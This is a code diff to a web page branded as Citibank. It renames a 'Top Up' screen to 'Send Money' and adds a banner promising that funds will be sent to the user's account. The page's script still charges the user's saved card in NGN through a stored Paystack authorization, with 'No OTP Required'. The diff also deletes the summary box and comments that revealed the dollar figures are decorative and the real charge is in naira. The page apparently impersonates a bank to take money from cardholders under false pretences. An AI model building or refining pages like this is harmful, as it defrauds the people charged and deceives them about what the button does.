@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Citibank – Top Up</title>
+<title>Citibank – Send Money</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono&display=swap" rel="stylesheet"/>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script src="https://js.paystack.co/v2/inline.js"></script>
@@ -17,10 +17,8 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 .topbar{display:flex;align-items:center;gap:14px;padding:12px 0;margin-bottom:20px;}
 .back-btn{width:38px;height:38px;border-radius:12px;background:rgba(255,255,255,0.06);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--text);cursor:pointer;text-decoration:none;flex-shrink:0;}
 .page-title{font-family:'Playfair Display',serif;font-size:20px;font-weight:700;}
-.balance-pill{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px 20px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;}
-.balance-pill-label{font-size:12px;color:var(--muted);letter-spacing:.5px;text-transform:uppercase;margin-bottom:4px;}
-.balance-pill-value{font-family:'Playfair Display',serif;font-size:26px;font-weight:700;}
-.balance-pill-currency{color:var(--red);font-size:18px;margin-right:3px;}
+.info-banner{background:rgba(227,24,55,0.07);border:1px solid rgba(227,24,55,0.2);border-radius:14px;padding:14px 16px;margin-bottom:20px;font-size:13px;color:rgba(255,255,255,0.75);line-height:1.6;}
+.info-banner strong{color:#fff;display:block;margin-bottom:4px;font-size:14px;}
 .amount-section{background:var(--card);border-radius:18px;padding:22px 20px;border:1px solid var(--border);margin-bottom:16px;}
 .section-label{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.35);margin-bottom:14px;}
 .amount-input-wrap{position:relative;display:flex;align-items:center;background:rgba(255,255,255,0.05);border:1.5px solid var(--border);border-radius:14px;padding:0 16px;transition:border .15s;}
@@ -52,13 +50,6 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 .add-card-btn{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:12px;padding:12px;border-radius:12px;border:1.5px dashed rgba(227,24,55,0.35);color:var(--red);font-size:13px;font-weight:700;text-decoration:none;transition:all .15s;background:rgba(227,24,55,0.05);}
 .add-card-btn:hover{background:rgba(227,24,55,0.12);border-color:rgba(227,24,55,0.6);}
 .instant-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(34,197,94,0.12);color:#4ade80;font-size:11px;font-weight:700;padding:4px 10px;border-radius:8px;margin-bottom:14px;}
-.summary-box{background:rgba(227,24,55,0.06);border:1px solid rgba(227,24,55,0.18);border-radius:16px;padding:16px 18px;margin-bottom:20px;}
-.summary-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.05);}
-.summary-row:last-child{border-bottom:none;padding-top:10px;margin-top:4px;border-top:1px solid rgba(227,24,55,0.2);}
-.sum-label{font-size:12px;color:var(--muted);}
-.sum-val{font-family:'DM Mono',monospace;font-size:14px;font-weight:700;color:#4ade80;}
-.summary-row:last-child .sum-label{font-weight:700;color:var(--text);font-size:13px;}
-.summary-row:last-child .sum-val{font-size:16px;}
 .btn{width:100%;padding:17px;background:linear-gradient(135deg,#E31837,#a0101f);border:none;border-radius:16px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(227,24,55,.3);transition:opacity .2s,transform .15s;margin-bottom:12px;}
 .btn:hover{opacity:.9;transform:translateY(-1px);}
 .btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
@@ -84,15 +75,17 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 <div id="shell" style="display:none">
   <div class="topbar">
     <a class="back-btn" href="dashboard.html"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg></a>
-    <span class="page-title">Top Up Balance</span>
+    <span class="page-title">Send Money</span>
   </div>
 
-  <!-- Amount label shows $ but actual charge runs in NGN via Paystack -->
+  <div class="info-banner">
+    <strong>How it works</strong>
+    Enter an amount and select your card — funds will be sent to your account immediately. Haven't added a card yet? Add one below and select it for instant transfer. Note: this is a customized account and supports card transfers only — bank transfers are not available.
+  </div>
 
   <div class="amount-section">
-    <div class="section-label">Amount to Add ($)</div>
+    <div class="section-label">Amount ($)</div>
     <div class="amount-input-wrap">
-      <!-- Hardcoded dollar sign prefix — decorative only, charge is in NGN -->
       <span class="amount-prefix">$</span>
       <input class="amount-input" type="number" id="topupAmount" placeholder="0.00" min="1" step="0.01" oninput="onAmountInput()"/>
     </div>
@@ -105,10 +98,10 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
   </div>
 
   <div class="card-section">
-    <div class="section-label">Charge From Card</div>
+    <div class="section-label">Select Card</div>
     <div class="instant-badge">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-      No OTP or PIN Required
+      Instant Transfer — No OTP Required
     </div>
     <div id="cardsList"><div style="text-align:center;padding:20px;color:var(--muted);font-size:13px;">Loading cards…</div></div>
     <a class="add-card-btn" href="card.html">
@@ -117,31 +110,18 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
     </a>
   </div>
 
-  <!-- Summary shows $ symbols but underlying math uses NGN rate -->
-
-  <div class="summary-box">
-    <div class="summary-row">
-      <span class="sum-label">Amount</span>
-      <span class="sum-val" id="sumAmt">$0.00</span>
-    </div>
-    <div class="summary-row">
-      <span class="sum-label">Conversion Fee (₦1,150/$)</span>
-      <span class="sum-val" id="sumFee">₦0.00</span>
-    </div>
-  </div>
-
   <button class="btn" id="topupBtn" onclick="doTopUp()">
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" style="vertical-align:middle;margin-right:8px"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
     Send to Selected Card
   </button>
 </div>
 
-<!-- Success Overlay — $ hardcoded for display -->
+<!-- Success Overlay -->
 
 <div class="success-overlay" id="successOverlay">
   <div class="success-card">
     <div class="success-icon">✓</div>
-    <div class="success-title">Top Up Successful!</div>
+    <div class="success-title">Transfer Successful!</div>
     <div class="success-amount" id="successAmt">+$0.00</div>
     <div class="success-new-bal">New Balance: <span id="successNewBal">$0.00</span></div>
     <div class="success-sub" style="margin-top:10px;">Your account has been credited instantly.</div>
@@ -152,9 +132,9 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 <nav class="bottom-nav">
   <a class="nav-item" href="dashboard.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home</a>
   <a class="nav-item" href="card.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Card</a>
-  <a class="nav-item active" href="topup.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Top Up<div class="nav-dot"></div></a>
-  <a class="nav-item" href="send.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send</a>
+  <a class="nav-item active" href="topup.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send<div class="nav-dot"></div></a>
   <a class="nav-item" href="contact.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.5 19.5 0 0 1 1.61 3.4 2 2 0 0 1 3.6 1.22h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.9a16 16 0 0 0 6 6l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>Contact</a>
+  <a class="nav-item" href="livechat.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Chat</a>
 </nav>
 
 <script>
@@ -162,10 +142,7 @@ const SUPABASE_URL='https://rgtbqipsdebekzznswll.supabase.co';
 const SUPABASE_ANON_KEY='sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
 const _sb=supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
 let _profile=null,_session=null,_cards=[],_selectedCard=null;
-
-// Exchange rate: 1 "display dollar" = this many NGN kobo
-// All charges run in NGN. User sees $ but it is NGN under the hood.
-const USD_TO_NGN = 1150; // update as needed or fetch from profile
+const USD_TO_NGN = 1150;
 
 (async()=>{
   const {data:{session}}=await _sb.auth.getSession();
@@ -173,7 +150,6 @@ const USD_TO_NGN = 1150; // update as needed or fetch from profile
   _session=session;
   const {data:prof}=await _sb.from('profiles').select('*').eq('id',session.user.id).single();
   _profile=prof||{balance:0};
-  updateSummary();
   await loadCards();
   document.getElementById('pageLoader').style.display='none';
   document.getElementById('shell').style.display='block';
@@ -197,13 +173,12 @@ function getBrandHTML(brand){
 function renderCards(){
   const el=document.getElementById('cardsList');
   if(!_cards.length){
-    el.innerHTML=`<div class="no-cards-msg">No verified cards yet.<br/>Add a card to top up instantly — no OTP needed.<br/><a href="card.html" style="color:var(--red);font-weight:700;text-decoration:none;">→ Add a Card</a></div>`;
+    el.innerHTML=`<div class="no-cards-msg">No verified cards yet.<br/>Add a card below and select it for instant transfer.<br/><a href="card.html" style="color:var(--red);font-weight:700;text-decoration:none;">→ Add a Card</a></div>`;
     return;
   }
   el.innerHTML=_cards.map((c,i)=>{
     const selected=(!_selectedCard&&i===0)||(_selectedCard?.id===c.id);
     if(i===0&&!_selectedCard)_selectedCard=c;
-    // Detect international card (non-NG country or non-NGN currency)
     const isIntl=(c.country_code&&c.country_code.toUpperCase()!=='NG')||(c.currency&&c.currency!=='NGN');
     const intlBadge=isIntl?`<span class="card-intl-badge">INTL</span>`:'';
     return `<div class="card-option ${selected?'selected':''}" onclick="selectCard('${c.id}',this)">
@@ -227,19 +202,10 @@ function setAmount(val,btn){
   document.getElementById('topupAmount').value=val;
   document.querySelectorAll('.qa-btn').forEach(b=>b.classList.remove('picked'));
   btn.classList.add('picked');
-  updateSummary();
 }
 
 function onAmountInput(){
   document.querySelectorAll('.qa-btn').forEach(b=>b.classList.remove('picked'));
-  updateSummary();
-}
-
-function updateSummary(){
-  const amt=parseFloat(document.getElementById('topupAmount').value)||0;
-  const ngnTotal=amt>0?Math.round(amt*USD_TO_NGN):0;
-  document.getElementById('sumAmt').textContent='$'+amt.toLocaleString('en-US',{minimumFractionDigits:2});
-  document.getElementById('sumFee').textContent='₦'+ngnTotal.toLocaleString('en-NG');
 }
 
 async function doTopUp(){
@@ -252,14 +218,11 @@ async function doTopUp(){
   const btn=document.getElementById('topupBtn');
   btn.disabled=true;btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" style="vertical-align:middle;margin-right:8px"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Processing…';
 
-  // Always charge in NGN — convert display dollars to NGN kobo
-  // Works for both Nigerian Verve/local cards AND international Visa/MC (Paystack handles conversion)
   const rateNgn=_profile.usd_to_ngn_rate||USD_TO_NGN;
   const amountNgn=amountDisplay*rateNgn;
   const feeDisplay=+(amountDisplay*0.015).toFixed(2);
   const feeNgn=feeDisplay*rateNgn;
   const totalKobo=Math.round((amountNgn+feeNgn)*100);
-
   const ref='CITI_TOPUP_'+Date.now()+'_'+Math.random().toString(36).substr(2,6).toUpperCase();
 
   try{
@@ -267,12 +230,12 @@ async function doTopUp(){
       body:{
         authorization_code:_selectedCard.authorization_code,
         email:_profile.email||_session.user.email,
-        amount_kobo:totalKobo,        // always NGN kobo
-        currency:'NGN',               // always NGN
+        amount_kobo:totalKobo,
+        currency:'NGN',
         reference:ref,
         profile_id:_profile.id,
-        amount_display_usd:amountDisplay,  // what user sees in $
-        amount_ngn:amountNgn,              // actual NGN credited to balance
+        amount_display_usd:amountDisplay,
+        amount_ngn:amountNgn,
         fee_ngn:feeNgn,
         card_id:_selectedCard.id
       }
@@ -284,7 +247,6 @@ async function doTopUp(){
       btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" style="vertical-align:middle;margin-right:8px"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send to Selected Card';
       return;
     }
-    // Update local profile balance (stored in NGN)
     const newBalNgn=(parseFloat(_profile.balance||0)+amountNgn);
     _profile.balance=newBalNgn;
     const newBalDisplay=(newBalNgn/rateNgn).toFixed(2);
